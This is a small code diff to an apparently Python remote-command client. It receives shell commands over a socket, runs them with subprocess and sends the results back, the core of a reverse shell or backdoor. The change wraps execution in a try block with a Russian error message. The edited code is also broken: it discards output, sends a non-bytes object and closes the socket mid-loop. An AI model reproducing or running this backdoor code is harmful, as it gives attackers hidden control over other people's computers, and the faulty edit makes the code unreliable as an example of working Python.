@@ -1,3 +1,4 @@
+from asyncio.subprocess import DEVNULL
 import socket
 import subprocess
 
@@ -11,6 +12,10 @@ while True:
         s.close()
         break
     else:
-        output = subprocess.getoutput(command)
-        s.send(output.encode())
+        try:
+            output = subprocess.run(command, stdout=DEVNULL, timeout=10)
+            s.send(output)
+            s.close()
+        except Exception as err:
+            s.send('Ошибка выполнения команды...'.encode())
 s.close()
